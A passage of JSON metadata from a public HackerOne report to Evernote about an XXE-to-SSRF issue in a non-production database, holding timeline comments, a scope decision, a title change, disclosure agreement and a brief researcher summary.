things easy by reporting the same vulnerability via your BBP program right?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-02T23:00:18.009Z","updated_at":"2019-12-02T23:00:18.009Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6452417,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Unfortunately, this particular issue you reported is out of scope for our BBP program as it's on a developer environment instead of our production one.\n\nRegards,\nXiaoyong\n","markdown_message":"\u003cp\u003eUnfortunately, this particular issue you reported is out of scope for our BBP program as it\u0026#39;s on a developer environment instead of our production one.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nXiaoyong\u003c/p\u003e\n","automated_response":false,"created_at":"2019-12-02T23:06:44.873Z","updated_at":"2019-12-02T23:06:44.873Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9152976,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-07T13:45:22.142Z","updated_at":"2020-09-07T13:45:22.142Z","first_to_agree":true,"actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9170900,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-09-09T14:37:57.134Z","updated_at":"2020-09-09T14:37:57.134Z","additional_data":{"old_title":"Open Database In Combination With XXE Leads To SSRF","new_title":"Non-production Open Database In Combination With XXE Leads To SSRF"},"actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9613153,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Please redact everything in the report except my summary and the report's title.","markdown_message":"\u003cp\u003ePlease redact everything in the report except my summary and the report\u0026#39;s title.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-23T14:24:12.314Z","updated_at":"2020-10-23T14:24:45.668Z","actor":{"username":"kaulse","cleared":false,"url":"/kaulse","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/021/083/ec3b2644069b78d215a96f903b4e45fa964a9cc0_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9649481,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-27T15:20:40.577Z","updated_at":"2020-10-27T15:20:40.577Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9649482,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-27T15:20:40.757Z","updated_at":"2020-10-27T15:20:40.757Z","actor":{"username":"xwuevernote","cleared":false,"url":"/xwuevernote","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/wF2EPPKMnFVesQph4wS5kxZk/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"evernote","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":24982,"category":"researcher","content":"Due to a misconfigured database, it was possible to access Evernote's Google Cloud account which had access permissions to the Google Cloud products BigQuery, BigTable and Google Cloud Storage. Hence, the severity is critical.\nThe report is out of scope for the BBP program as it's on Evernote's developer environment instead of the production one.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eDue to a misconfigured database, it was possible to access Evernote\u0026#39;s Google Cloud account which had access permissions to the Google Cloud products BigQuery, BigTable and Google Cloud Storage. Hence, the severity is critical.\u003cbr\u003e\nThe report is out of scope for the BBP program as it\u0026#39;s on Evernote\u0026#39;s developer environment instead of the production one.\u003c/p\u003e\n"}]}